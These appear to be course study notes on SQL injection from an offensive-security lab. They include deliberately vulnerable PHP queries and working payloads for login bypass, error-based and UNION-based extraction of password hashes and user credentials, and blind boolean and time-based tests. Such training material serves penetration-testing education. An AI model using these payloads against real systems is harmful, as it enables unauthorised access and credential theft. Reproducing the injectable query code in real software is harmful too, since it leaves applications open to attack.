
SQL injections are often discovered and abused using automated tools such as [_sqlmap_](http://sqlmap.org/)

### Identify SQLi via Error-based Payloads

PHP Code Vulnerable to SQL injection

```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

Testing for SQLi Authentication Bypass

```
offsec' OR 1=1 -- //
```

Injected SQL statement

```
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```

Testing for SQLi Authentication Bypass 1

![Figure 1: Testing for SQLi Authentication Bypass 1](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/438ec513f7324e6814e92788ed3d3161-auth_bypass0.png)

Testing for SQLi Authentication Bypass 2

![Figure 2: Testing for SQLi Authentication Bypass 2](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/404f6a1bc21e7f0b3807c6fc9be8ccc8-auth_bypass3.png)

SQLi payload inside the 'Username' field

![Figure 3: SQLi payload inside the 'Username' field](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/8f7aa17e60e859478db1bf0d4ef8da85-auth_bypass4.png)

This resulted in authentication successful. 

We can try enumerating the database directly.

Error-based payload to retrieve the MySQL version.

```
' or 1=1 in (select @@version) -- //
```

Testing for Error-based payload

![Figure 5: Testing for Error-based payload](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/467bf58aa436ce35f33c581564392808-error1.png)

Got the MySQL version.

Attempting to retrieve the Users table

```
' OR 1=1 in (SELECT * FROM users) -- //
```

Testing this payload

![Figure 6: Testing for Error-based payload](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/1927c06d6e2561326f1b576f820dca3e-auth_bypass5.png)

Only query one column at a time.

Let's query for only the password column 

```
' or 1=1 in (SELECT password FROM users) -- //
```

Retrieving Users Hashes

![Figure 7: Retrieving Users Hashes](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/ea94c86bbeaca6dc505dd5e9ded557be-error2.png)

Don't know which user has which password. Adding WHERE clause to payload.

```
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Retrieving admin's hash

![Figure 8: Retrieving Users Hashes](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/3d719b7d388ba7d7c9db027421cbe23e-error3.png)

### UNION Based Payloads

UNION keyword allows for an extra SELECT statement.

UNION SQLi needs to meet these conditions:
1. UNION query has same number of columns as original query
2. Data types between columns are compatible

Vulnerable SQL Query:

```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

Verifying the exact number of columns

```
' ORDER BY 1-- //
```

Increment number by one until we get an error. 

Finding the Exact Number of Columns

![Figure 10: Finding the Exact Number of Columns](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/34889ebae67344beee8337e6e122cf0d-union2.png)

Unknown column '6' tell us we have 5 columns. 

Enumerating the Database via SQL UNION Injection

```
%' UNION SELECT database(), user(), @@version, null, null -- //
```

![Figure 11: Enumerating the Database](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/5a5310041c4a4d23f5f403bcba74d172-union3.png)

Attack worked. Except we're missing the database name. We need to shift everything because typically column 1 is an ID field. 

```
' UNION SELECT null, null, database(), user(), @@version  -- //
```

![Figure 12: Fixing the SQL Query](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/f485572f56d54c0cdff7010613f1ad47-union4.png)

Got all three values.

Enumerating  _information_schema.columns_ table

Retrieving Current Database Tables and Columns

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
Dumping the Current Database Tables Structure

![Figure 13: Dumping the Current Database Tables Structure](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/283e09223e6ed889bd4830f52aea6b18-union5.png)

Three columns contain `table name`, `column name`, `current database`

New table discovered: users with password column

New query to dump the _users_ table

```
' UNION SELECT null, username, password, description, null FROM users -- //
```

Dumping Users Credentials

![Figure 14: Dumping Users Credentials](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/c3e1a976980eb05221d67b87c034c33b-union6.png)

### Blind SQL Injections 

Database responses are not returned. 

Testing for Blind SQLi

![Figure 15: Testing for Blind SQLi](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/sqli/61b7cc113f94983319ad5ec9760123c0-blind1.png)

Testing for boolean-based SQLi in the URL

```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

Because 1=1 is always TRUE, app will only return results if that username exists.

Testing for time-based SQLi

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
This IF condition will always be TRUE, but will return FALSE if the user does not exist.




